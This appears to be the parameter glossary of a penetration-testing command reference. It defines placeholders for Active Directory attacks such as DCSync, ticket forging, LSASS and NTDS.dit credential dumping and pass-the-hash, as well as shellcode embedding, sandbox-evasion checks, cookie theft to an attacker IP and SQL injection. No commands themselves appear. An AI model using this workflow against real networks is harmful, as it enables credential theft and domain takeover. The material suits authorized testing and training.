name: <USERNAME>
description: SMB username (or use '' for null session)

name: <PASSWORD>
description: SMB password (or use '' for null session)

name: <MOUNT_POINT>
description: Local directory to mount share to (must exist)

name: <RULE_NAME>
description: Descriptive name for the firewall rule

name: <LISTEN_IP>
description: IP to listen on (0.0.0.0 for all)

name: <COMMAND>
description: Command to execute on remote system (spawns in session 0 as SYSTEM service)

name: <LOCAL_PORT>
description: Local port to bind on attacker machine

name: <SSH_HOST>
description: SSH server (pivot host) IP or hostname

name: <REMOTE_PORT>
description: Port to bind on SSH server

name: <DATABASE>
description: Database name to connect to (default: postgres)

name: <EXECUTABLE>
description: Executable name to search for (e.g., ssh, plink, python)

name: <BIND_ADDRESS>
description: IP address to bind listening port (0.0.0.0 for all interfaces, 127.0.0.1 for loopback only)

name: <SSH_PASSWORD>
description: SSH password for authentication (use -i for key file)

name: <CIDR>
description: Subnet mask in CIDR notation (e.g., 24 for /24)

name: <KEY_FILE>
description: Path to private SSH key file (id_rsa, id_ecdsa, id_ed25519)

name: <TOP_PORTS>
description: Number of top ports to scan (use 20 for speed, 100 for thoroughness)

name: DOMAIN
description: Domain name (NetBIOS or FQDN). Use quotes around full auth string to handle special characters in password.

name: USER
description: Admin username with appropriate rights (Domain Admin for DCSync, local admin for SAM/LSA, both for NTDS.dit extraction)

name: PASS
description: Password or use -hashes :NTLM_HASH for pass-the-hash. Escape special characters (!, $) with backslash or use single quotes.

name: TARGET
description: Target DC IP (for DCSync) or member server IP (for SAM/LSA). Use IP to avoid DNS issues.

name: <SERVICE_NAME>
description: Name of the Windows service to query

name: <BINARY_PATH>
description: Path to binary file to analyze

name: <LDAP_OUTPUT_FILE>
description: File containing LDAP query output with DN paths

name: <YOUR_SID>
description: Security Identifier (SID) of current user or group

name: <BINARY>
description: Path to binary file to analyze

name: <KEYWORD>
description: Keyword to search for in strings output

name: <FILE_PATH>
description: Full or relative path to file. Supports: Absolute paths (C:\Users\admin\Desktop\flag.txt), Relative paths (.\flag.txt, ..\..\file.txt), UNC paths (\\\\server\\share\\file.txt), Environment variables (%USERPROFILE%\\Desktop\\flag.txt). Wildcards NOT supported (use 'for' loop for multiple files).

name: <COUNT>
description: Number of ping packets to send

name: <TYPE>
description: Record type (A, AAAA, MX, NS, TXT, ANY)

name: <LINK>
description: Name of symbolic link to create

name: <HASH_FILE>
description: File containing NTLM hash (from secretsdump, mimikatz, etc.)

name: <JOB_NAME>
description: Arbitrary transfer job name (required, can be anything)

name: <PROCESS_NAME>
description: Exact or partial process name to search for

name: <THRESHOLD_SEC>
description: Minimum acceptable elapsed time in seconds (slightly less than sleep to allow processing time)

name: <LARGE_SIZE>
description: Memory size to allocate in bytes (100000000 = ~100MB)

name: <MIN_CORES>
description: Minimum required CPU cores (2 or 4 typical)

name: <MIN_FILES>
description: Minimum expected recent files (5-10 typical for real system)

name: <MIN_UPTIME_MINUTES>
description: Minimum system uptime in minutes (10-30 typical)

name: <EMBEDDED_PAYLOAD_CONTENT>
description: Payload content to embed after marker (PowerShell script, binary, etc.)

name: <ADDRESS>
description: Memory address or register name (rsp, rcx, rip, etc.)

name: <INTERVAL>
description: Byte interval for binary search (start large: 10000, then narrow: 1000, 100, 10, 1)

name: <ITERATIONS>
description: Encoding iterations (more = better obfuscation, larger payload)

name: <TEMPLATE_EXE>
description: Legitimate executable to use as template

name: <SHELLCODE>
description: Raw shellcode bytes in C# format (0xfc,0x48,0x83,...)

name: <PAYLOAD_COMMAND>
description: Command to execute with high integrity (admin)

name: <SHELLCODE_BYTES>
description: Shellcode as VBA byte array (comma-separated decimal values)

name: <DOMAIN_FQDN>
description: Fully Qualified Domain Name of the Active Directory domain

name: <DOMAIN_SID>
description: Domain Security Identifier WITHOUT the user RID. Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX (exclude the trailing -500, -1001, etc.). Obtain with: whoami /user (remove last segment after final hyphen).

name: <KRBTGT_NTLM>
description: NTLM password hash of the krbtgt account (obtained via DCSync or LSA dump). 32 hexadecimal characters.

name: <TARGET_FQDN>
description: Fully Qualified Domain Name of target system (e.g., DC1.corp.com, WEB01.corp.com). CRITICAL: Use FQDN/hostname, NOT IP address. IP forces NTLM authentication; FQDN uses Kerberos.

name: <DRIVE_LETTER>
description: Drive letter to snapshot (typically C for system drive containing NTDS.dit)

name: <SHADOW_NUMBER>
description: Shadow copy device number from vssadmin list shadows output (incremental: 1, 2, 3...)

name: <OUTPUT_PATH>
description: Destination path for extracted NTDS.dit file

name: <NTDS_FILE>
description: Path to extracted NTDS.dit file on Kali

name: <SYSTEM_FILE>
description: Path to exported SYSTEM registry hive on Kali

name: DOMAIN_FQDN
description: Fully Qualified Domain Name of the target Active Directory domain

name: TARGET_USER
description: Username of the target account to dump credentials for. Common high-value targets: Administrator, krbtgt (for Golden tickets), or compromised admin accounts.

name: USERNAME
description: Domain admin username (or user with replication rights) to authenticate as

name: PASSWORD
description: Password for the authenticating user. Escape special characters with backslash (\! for !).

name: DC_IP
description: IP address or FQDN of the domain controller. IP is more reliable (avoids DNS issues).

name: <TICKET_FILE>
description: Path to .kirbi ticket file or base64 ticket

name: <CA_NAME>
description: Certificate Authority name from certipy find

name: <NTLM_HASH>
description: NTLM hash (32 hex chars) obtained from sekurlsa::logonpasswords or lsadump::sam

name: <DUMP_FILE>
description: Path to LSASS memory dump file (.dmp)

name: <USERFILE>
description: File containing single username to validate (or use multi-user file to validate password across multiple accounts)

name: <DA_USER>
description: Domain Admin username for authentication (without domain prefix)

name: DOMAIN_SID
description: Domain Security Identifier (without user RID). Extract with 'whoami /user' and remove last segment after final hyphen.

name: TARGET_SERVER_FQDN
description: Fully Qualified Domain Name of the server hosting the target SPN. Must match SPN registration exactly (case-insensitive but FQDN required).

name: SPN_SERVICE
description: Service Principal Name type. Common types: cifs (file shares), http (IIS/web), mssql (SQL Server), ldap (directory services), host (multiple services), rpcss (RPC), wsman (PowerShell remoting).

name: SERVICE_ACCOUNT_NTLM
description: NTLM hash of the service account that runs the target SPN. Obtain via Kerberoasting (crack TGS), LSASS dump (if service account logged on), or DCSync.

name: IMPERSONATED_USER
description: Username to impersonate in the forged ticket. Can be ANY domain user (existing or fictional). Mimikatz sets group memberships to Domain Admins by default.

name: TARGET_SERVER
description: Hostname or partial hostname of the target server. Wildcards (*) are supported for fuzzy matching.

name: <TARGET_RANGE>
description: Target hosts (single IP, CIDR range, or hostname). Use CIDR for subnet spray.

name: <GPO_NAME>
description: Display name of the GPO with write permissions (use exact name from Get-NetGPO or icacls)

name: <ATTACKER_IP>
description: Attacker's IP address to receive stolen cookies

name: <MAX_COLS>
description: Maximum columns to test (default 20 is usually sufficient)

name: <NULL_COLUMNS>
description: Comma-separated NULL values matching column count from ORDER BY enumeration (e.g., 'test1',NULL,NULL,'test2' for 4 columns)

name: <EMPTY_COLS>
description: Remaining NULL columns to match total column count

name: <OPTIONS>
description: Additional sqlmap options (see flag_explanations for common options)

name: <WPSCAN_API_TOKEN>
description: WPScan API token from wpscan.com (free tier: 25 requests/day, register at https://wpscan.com/register)

name: <USERS>
description: Username(s) to test - comma-separated list or file path

name: <REQUEST_FILE>
description: Path to saved HTTP request file from Burp (Copy to file â†’ Save)

name: <PARAMETER>
description: Parameter to test for SQL injection

name: <GROUPNAME>
description: Domain group name (use quotes if spaces)

name: <CPASSWORD>
description: Encrypted cpassword value from Groups.xml or ScheduledTasks.xml

name: <PRIVATE_KEY>
description: Path to SSH private key file

name: <OBJECT>
description: AD object to query (username, groupname, or DN)

name: <SEARCH>
description: Optional search term to filter formats

name: <RULE_FILE>
description: File containing custom rules with [List.Rules:Name] header

name: <GROUP_NAME>
description: AD group name to query (e.g., 'Domain Admins', 'Service Personnel')

name: <LM_HASH>
description: LM hash (use empty string 'aad3b435b51404eeaad3b435b51404ee' if not available)

name: <NT_HASH>
description: NTLM hash from credential dump (32 hex characters)

name: <COMPUTER_FILE>
description: File containing FQDNs of computers to enumerate (one per line)

name: <FAIL_CODE>
description: HTTP status code to hide (failed login attempts)

name: <INTERFACE>
description: Network interface to use for scanning (use 'ip a' to list)

name: <GATEWAY>
description: Gateway IP address for routing (use 'ip route' to find)

name: <LINE_COUNT>
description: Number of lines in wordlist (from wc -l)

name: <RULE_COUNT>
description: Number of rules in rule file

name: <LOGIN_PAGE>
description: Path to login page (from Burp intercept)

name: <CREDENTIAL_FILE>
description: File with username:password pairs (one per line)

name: <VSHADOW_PATH>
description: Full path to vshadow.exe on target DC (must be pre-uploaded)

name: <LSASS_PID>
description: LSASS process ID (get with: tasklist /fi "imagename eq lsass.exe" OR (Get-Process lsass).Id)

name: <REGISTRY_PATH>
description: Registry path to query (HKLM:, HKCU:, etc.)

name: <WRITABLE_SCRIPT>
description: Path to script that cron runs as root and you can write to

name: <ORIGINAL_PATH>
description: Full path to original service binary

name: <BACKUP_PATH>
description: Path to store original binary backup

name: <PAYLOAD_PATH>
description: Path to malicious binary to use as replacement

name: <WEB_ROOT>
description: Web server document root directory. Identify from running processes (httpd, w3wp) or common paths.

name: <SESSION_ID>
description: Session ID to interact with (use 1 for first logged-on user, query user to find)

name: <RESOURCE_SCRIPT>
description: Path to .rc file containing Metasploit commands

name: <WORKSPACE_NAME>
description: Unique name for workspace (alphanumeric, underscores, hyphens)

name: <QUERY>
description: Search term (service name, CVE ID, keyword, or platform)

name: <MODULE_PATH>
description: Full module path (e.g., exploit/unix/ftp/vsftpd_234_backdoor) or search result index number

name: <SCAN_FILE>
description: Path to scan results file (nmap XML, .nessus, etc)

name: <NMAP_OPTIONS>
description: Nmap flags (same syntax as standalone nmap)

name: <PLATFORM>
description: Target platform (windows, linux, osx, unix, etc.)

name: <TARGET_ID>
description: Target ID number from 'show targets' output

name: <EDB_ID>
description: Exploit-DB ID number or full path to exploit

name: <SCRIPT_NAME>
description: NSE script name or pattern (wildcards supported)

name: <PROGRAM>
description: Program to execute (full path or command name)

name: <ARCH>
description: Target architecture (x86, x64, arm, mips, etc)

name: <BAD_CHARS>
description: Characters to avoid in payload (hex format)
